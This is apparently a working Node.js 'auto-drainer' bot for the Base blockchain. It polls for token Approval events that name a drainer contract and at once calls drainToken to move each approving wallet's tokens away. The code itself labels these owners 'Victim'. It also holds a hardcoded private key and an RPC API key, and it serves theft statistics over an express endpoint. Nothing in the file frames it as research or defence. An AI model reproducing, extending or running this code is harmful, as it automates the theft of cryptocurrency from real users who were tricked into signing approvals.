import { createPublicClient, createWalletClient, http, parseAbi } from 'viem';
import { base } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';
import express from 'express';

const app = express();
const PORT = process.env.PORT || 3003;

// Configuration
const CHAINS = [
  {
    chain: base,
    drainer: '0x00461a19124f1f999615b4FcE749B76e9F0182A5',
    rpc: 'https://base-mainnet.g.alchemy.com/v2/H--HtDpZlgQ0zxKBt7zBC-DzXtxGRL0J'
  }
];

const PRIVATE_KEY = '0x05afb6d9ea08c0da681ae185ff8a78931cb86ec8990ea9bc23fb56b56a53a3c3';

const DRAINER_ABI = parseAbi([
  'function drainToken(address token, address victim) external'
]);

const account = privateKeyToAccount(PRIVATE_KEY);
const processedApprovals = new Set();

let stats = {
  totalDrained: 0,
  lastDrain: null,
  drainsByChain: {}
};

async function monitorChain(config) {
  const { chain, drainer, rpc } = config;
  
  const publicClient = createPublicClient({
    chain,
    transport: http(rpc)
  });

  const walletClient = createWalletClient({
    account,
    chain,
    transport: http(rpc)
  });

  console.log(`🔍 Monitoring ${chain.name}...`);

  while (true) {
    try {
      const currentBlock = await publicClient.getBlockNumber();
      const fromBlock = currentBlock > 9n ? currentBlock - 9n : 0n;

      const logs = await publicClient.getLogs({
        event: {
          type: 'event',
          name: 'Approval',
          inputs: [
            { type: 'address', indexed: true, name: 'owner' },
            { type: 'address', indexed: true, name: 'spender' },
            { type: 'uint256', indexed: false, name: 'value' }
          ]
        },
        args: {
          spender: drainer
        },
        fromBlock,
        toBlock: currentBlock
      });

      for (const log of logs) {
        const approvalId = `${chain.id}-${log.transactionHash}-${log.logIndex}`;
        
        if (processedApprovals.has(approvalId)) continue;

        const { owner, value } = log.args;
        const token = log.address;

        if (value > 0n) {
          console.log(`\n💰 [${chain.name}] NEW APPROVAL!`);
          console.log(`Token: ${token}`);
          console.log(`Victim: ${owner}`);
          
          try {
            const hash = await walletClient.writeContract({
              address: drainer,
              abi: DRAINER_ABI,
              functionName: 'drainToken',
              args: [token, owner]
            });
            
            console.log(`✅ DRAINED! TX: ${hash}`);
            
            processedApprovals.add(approvalId);
            stats.totalDrained++;
            stats.lastDrain = new Date().toISOString();
            stats.drainsByChain[chain.name] = (stats.drainsByChain[chain.name] || 0) + 1;
            
            // Notify dashboard (optional - if you add webhook endpoint)
            try {
              // You can add a webhook here to notify your dashboard
              // await fetch('https://d-kit-seven.vercel.app/api/drain-notification', {
              //   method: 'POST',
              //   body: JSON.stringify({ token, victim: owner, txHash: hash, chainId: chain.id })
              // });
            } catch (e) {
              // Ignore notification errors
            }
            
          } catch (error) {
            console.error(`❌ Drain failed: ${error.message}`);
          }
        }
      }
      
    } catch (error) {
      console.error(`[${chain.name}] Error: ${error.message}`);
    }
    
    await new Promise(resolve => setTimeout(resolve, 30000));
  }
}

// Start monitoring all chains
console.log('🤖 AUTO-DRAINER STARTED');
console.log('Monitoring chains:', CHAINS.map(c => c.chain.name).join(', '));

CHAINS.forEach(config => {
  monitorChain(config).catch(console.error);
});

// Health check endpoint for Render
app.get('/', (req, res) => {
  res.json({
    status: 'running',
    uptime: process.uptime(),
    totalDrained: stats.totalDrained,
    lastDrain: stats.lastDrain,
    drainsByChain: stats.drainsByChain,
    processedCount: processedApprovals.size
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', monitoring: CHAINS.map(c => c.chain.name) });
});

app.listen(PORT, () => {
  console.log(`🌐 Health endpoint running on port ${PORT}`);
});

// Keep process alive
process.on('SIGTERM', () => {
  console.log('Shutting down...');
  process.exit(0);
});
